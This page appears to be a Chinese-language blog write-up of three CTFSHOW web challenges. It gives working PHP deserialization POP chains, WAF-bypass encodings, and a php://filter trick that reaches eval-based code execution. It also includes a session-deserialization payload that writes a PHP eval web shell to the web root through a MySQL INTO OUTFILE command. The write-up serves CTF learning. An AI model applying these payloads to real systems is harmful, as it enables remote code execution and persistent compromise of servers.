<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【Web】CTFSHOW元旦水友赛部分wp - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【Web】CTFSHOW元旦水友赛部分wp" />
<meta property="og:description" content="目录
①easy_include
②easy_web
③easy_login
web一共5题，我出了3题，巧的是好像师傅们也只出了3题，跨年拿旗还是很快乐的，下面直接贴出自己的wp.
①easy_include pearcmd不解释
这里主要是 ，file://协议支持以file://localhost/etc/hosts的方式访问服务器文件,来绕过开头必须是字母的限制
②easy_web 代码审计，大致思路是通过构造pop链实现class Chu0_write类中的eval函数RCE
首先传参是show_show.show，php变量名只能是数字字母下划线，传进去的变量名会将 , &#43;,.,[等符号转换成_，若变量中有. 号，可以用[替换_后，之后的字符不会再被替换成_
构造的参数是show[show.show
有两个waf
第一个waf1是用urlencode绕过，即不会出现字母字符，注意是对$_REQUEST进行waf判断的，request的顺序：GET&lt;POST，因此绕过的思路只需要同时POST一个相同参数对应数字即可绕过%73%68%6f%77[%73%68%6f%77.%73%68%6f%77=1&amp;chu0=1&amp;name=1&amp;cmd=1
第二个waf2不能出现show，那么用base64-encode --&gt; utf-8 -&gt; utf-16 --&gt; convert.quoted-printable-decode绕过，我们编写个脚本
$content=&#39;ctfshowshowshowwww&#39;.$_GET[&#39;chu0&#39;];
chu0参数需要传system，按照下面的脚本
&lt;?php $b =&#39;system&#39;; $payload = iconv(&#39;utf-8&#39;, &#39;utf-16&#39;, base64_encode($b)); file_put_contents(&#39;payload.txt&#39;, quoted_printable_encode($payload)); $s = file_get_contents(&#39;payload.txt&#39;); $s = preg_replace(&#39;/=\r\n/&#39;, &#39;&#39;, $s); echo $s; 运行后得到c=003=00l=00z=00d=00G=00V=00t=00
现在来构造序列化链
首先__wakeup()方法中有一个throw new Exception(&#34;fastfast&#34;);，回强制GC回收导致__destruct魔术方法不起作用从而触发不了其他魔术方法，
使用数组绕过。详解见ctfshow 第三届愚人杯 easy_php_愚人杯3rd [easy_php]-CSDN博客的ctfshow 第三届愚人杯 easy_php
&lt;?php highlight_file(__file__); class ctf{ public $h1; public $h2; public function __wakeup(){ throw new Exception(&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/f50ee3d38531c2c185be7f537e9ab447/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-02T23:14:50+08:00" />
<meta property="article:modified_time" content="2024-01-02T23:14:50+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【Web】CTFSHOW元旦水友赛部分wp</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="%E2%91%A0easy_include-toc" style="margin-left:0px;"><a href="#%E2%91%A0easy_include" rel="nofollow">①easy_include</a></p> 
<p id="%E2%91%A1easy_web-toc" style="margin-left:0px;"><a href="#%E2%91%A1easy_web" rel="nofollow">②easy_web</a></p> 
<p id="%E2%91%A2easy_login-toc" style="margin-left:0px;"><a href="#%E2%91%A2easy_login" rel="nofollow">③easy_login</a></p> 
<hr id="hr-toc"> 
<p></p> 
<p>web一共5题，我出了3题，巧的是好像师傅们也只出了3题，跨年拿旗还是很快乐的，下面直接贴出自己的wp.</p> 
<h2 id="%E2%91%A0easy_include">①easy_include</h2> 
<p><img alt="" height="231" src="https://images2.imgbox.com/4b/5e/cvqfbuQ8_o.png" width="393"></p> 
<p>pearcmd不解释</p> 
<p>这里主要是 ，file://协议支持以file://localhost/etc/hosts的方式访问服务器文件,来绕过开头必须是字母的限制</p> 
<p><img alt="" height="737" src="https://images2.imgbox.com/ed/72/2XVvajH4_o.png" width="1072"></p> 
<p> <img alt="" height="737" src="https://images2.imgbox.com/c6/68/S3psd6Kj_o.png" width="1072"></p> 
<h2 id="%E2%91%A1easy_web">②easy_web</h2> 
<p style="margin-left:.0001pt;text-align:justify;">代码审计，大致思路是通过构造pop链实现class Chu0_write类中的eval函数RCE</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">首先传参是show_show.show，php变量名只能是数字字母下划线，传进去的变量名会将  , +,.,[等符号转换成_，若变量中有. 号，可以用[替换_后，之后的字符不会再被替换成_</p> 
<p style="margin-left:.0001pt;text-align:justify;">构造的参数是show[show.show</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">有两个waf</p> 
<p style="margin-left:.0001pt;text-align:justify;">第一个waf1是用urlencode绕过，即不会出现字母字符，注意是对$_REQUEST进行waf判断的，request的顺序：GET&lt;POST，因此绕过的思路只需要同时POST一个相同参数对应数字即可绕过%73%68%6f%77[%73%68%6f%77.%73%68%6f%77=1&amp;chu0=1&amp;name=1&amp;cmd=1</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">第二个waf2不能出现show，那么用base64-encode --&gt; utf-8 -&gt; utf-16 --&gt; convert.quoted-printable-decode绕过，我们编写个脚本</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">$content='ctfshowshowshowwww'.$_GET['chu0'];</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">chu0参数需要传system，按照下面的脚本</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<pre><code>&lt;?php

$b ='system';

$payload = iconv('utf-8', 'utf-16', base64_encode($b));

file_put_contents('payload.txt', quoted_printable_encode($payload));

$s = file_get_contents('payload.txt');

$s = preg_replace('/=\r\n/', '', $s);

echo $s;</code></pre> 
<p></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">运行后得到c=003=00l=00z=00d=00G=00V=00t=00</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">现在来构造序列化链</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">首先__wakeup()方法中有一个throw new Exception("fastfast");，回强制GC回收导致__destruct魔术方法不起作用从而触发不了其他魔术方法，</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">使用数组绕过。详解见<a href="https://blog.csdn.net/m0_64815693/article/details/130038356" title="ctfshow 第三届愚人杯 easy_php_愚人杯3rd [easy_php]-CSDN博客">ctfshow 第三届愚人杯 easy_php_愚人杯3rd [easy_php]-CSDN博客</a>的ctfshow 第三届愚人杯 easy_php</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<pre><code>&lt;?php

highlight_file(__file__);

class ctf{

    public $h1;

    public $h2;


    public function __wakeup(){

        throw new Exception("fastfast");

    }


    public function __destruct()

    {

        $this-&gt;h1-&gt;nonono($this-&gt;h2);

    }

}


class show{


    public function __call($name,$args){

        if(preg_match('/ctf/i',$args[0][0][2])){

            echo "gogogo";

        }

    }

}


class Chu0_write{

    public $chu0;

    public $chu1;

    public $cmd;

    public function __construct(){

        $this-&gt;chu0 = 'xiuxiuxiu';

    }


    public function __toString(){

        echo "__toString"."&lt;br&gt;";

        if ($this-&gt;chu0===$this-&gt;chu1){

            $content='ctfshowshowshowwww'.$_GET['chu0'];

            if (!waf_in_waf_php($_GET['name'])){

                file_put_contents($_GET['name'].".txt",$content);

            }else{

                echo "绕一下吧孩子";

            }

                $tmp = file_get_contents('ctfw.txt');

                echo $tmp."&lt;br&gt;";

                if (!preg_match("/f|l|a|g|x|\*|\?|\[|\]| |\'|\&lt;|\&gt;|\%/i",$_GET['cmd'])){

                    eval($tmp($_GET['cmd']));

                }else{

                    echo "waf!";

                }


            file_put_contents("ctfw.txt","");

        }

        return "Go on";

        }

}


$a = new ArrayObject;


$a -&gt; a = new ctf;

$a -&gt;a-&gt;h1=new show();

$a -&gt;a-&gt;h2=new Chu0_write();


echo serialize($a);</code></pre> 
<p></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">最后得到payload的O改为C，得到</p> 
<p style="margin-left:.0001pt;text-align:justify;">C:11:"ArrayObject":164:{x:i:0;a:1:{s:9:"gxngxngxn";O:3:"ctf":2:{s:2:"h1";O:4:"show":0:{}s:2:"h2";a:1:{i:0;a:1:{i:2;O:10:"Chu0_write":3:{s:4:"chu0";N;s:4:"chu1";N;s:3:"cmd";N;}}}}};m:a:0:{}}</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">Cmd参数为env，flag在环境变量中</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">最终payload如下：</p> 
<pre><code>POST /?%73%68%6f%77[%73%68%6f%77.%73%68%6f%77=%43%3a%31%31%3a%22%41%72%72%61%79%4f%62%6a%65%63%74%22%3a%31%36%34%3a%7b%78%3a%69%3a%30%3b%61%3a%31%3a%7b%73%3a%39%3a%22%67%78%6e%67%78%6e%67%78%6e%22%3b%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%31%3a%7b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%4e%3b%73%3a%34%3a%22%63%68%75%31%22%3b%4e%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d%3b%6d%3a%61%3a%30%3a%7b%7d%7d&amp;chu0=c=003=00l=00z=00d=00G=00V=00t=00&amp;name=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8/convert.base64-decode/resource=ctfw&amp;cmd=env HTTP/1.1

Host: 935263de-7c5b-4e7d-9528-c32add0787dc.challenge.ctf.show

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 60


%73%68%6f%77[%73%68%6f%77.%73%68%6f%77=1&amp;chu0=1&amp;name=1&amp;cmd=1</code></pre> 
<p><img alt="" height="870" src="https://images2.imgbox.com/67/41/m6vkIOpI_o.png" width="1200"></p> 
<p></p> 
<h2 id="%E2%91%A2easy_login">③easy_login</h2> 
<p style="margin-left:.0001pt;text-align:justify;">查看common.php和index.php</p> 
<p style="margin-left:.0001pt;text-align:justify;">在common.php文件的userLogger类中有写入文件操作，假设我们可以反序列化改变类属性，我们就可以写马到文件getshell</p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="1021" src="https://images2.imgbox.com/11/78/7rsxlRg3_o.png" width="1200"></p> 
<p>题目源码有很多类、没有反序列化函数unserialize()，但是开启了session（index.php），同时在application::getLoginName()方法（common.php）中有session操作。这里能进行session反序列化。</p> 
<p><img alt="" height="215" src="https://images2.imgbox.com/41/2d/iTkLCjeK_o.png" width="739"></p> 
<p>注册一个账号，用户名为Jay|17，拿到用户cookie。后续操作发包时要带上cookie。然后登录（do_login）。</p> 
<p><img alt="" height="946" src="https://images2.imgbox.com/89/e8/Bm1SOvdy_o.png" width="1200"></p> 
<p style="margin-left:.0001pt;text-align:justify;">Cookie：user=Jay%7C17%7Cf1d7cd28dc915e876179dcce95e6c8c1</p> 
<p style="margin-left:.0001pt;text-align:justify;">构造序列化字符串：</p> 
<pre><code>&lt;?php
session_start();
class mysql_helper
{
    public $option = array(
        PDO::MYSQL_ATTR_INIT_COMMAND =&gt; "select '&lt;?php eval(\$_POST[1]);phpinfo();?&gt;'  into outfile '/var/www/html/1.php';"
    );
}
class application
{
    public $mysql;
    public $debug = true;

    public function __construct()
    {
        $this-&gt;mysql = new mysql_helper();
    }
}

$a = new application();
echo urlencode(serialize($a));</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">得到</p> 
<p style="margin-left:.0001pt;text-align:justify;">O%3A11%3A%22application%22%3A2%3A%7Bs%3A5%3A%22mysql%22%3BO%3A12%3A%22mysql_helper%22%3A1%3A%7Bs%3A6%3A%22option%22%3Ba%3A1%3A%7Bi%3A1002%3Bs%3A80%3A%22select+%27%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3Bphpinfo%28%29%3B%3F%3E%27++into+outfile+%27%2Fvar%2Fwww%2Fhtml%2F1.php%27%3B%22%3B%7D%7Ds%3A5%3A%22debug%22%3Bb%3A1%3B%7D</p> 
<p style="margin-left:.0001pt;text-align:justify;">payload：（记得带上Cookie）</p> 
<pre><code>GET：/index.php?action=hahaha&amp;token=user|O%3A11%3A%22application%22%3A2%3A%7Bs%3A5%3A%22mysql%22%3BO%3A12%3A%22mysql_helper%22%3A1%3A%7Bs%3A6%3A%22option%22%3Ba%3A1%3A%7Bi%3A1002%3Bs%3A80%3A%22select+%27%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3Bphpinfo%28%29%3B%3F%3E%27++into+outfile+%27%2Fvar%2Fwww%2Fhtml%2F1.php%27%3B%22%3B%7D%7Ds%3A5%3A%22debug%22%3Bb%3A1%3B%7D

POST：username=Jay%7C17&amp;password=123456</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;">访问1.php，能看见phpinfo，说明写入成功并且执行了，开始getshell。</p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="970" src="https://images2.imgbox.com/a6/6b/yZrdtJvi_o.png" width="1200"></p> 
<p></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/c63179f5277ea93b6cedca97b619fa6a/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">从信号处理角度彻底理解FFT</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/7eb63327937520dbad384e717895d30b/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">解决 svn: Can‘t read stdin:End of file found</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>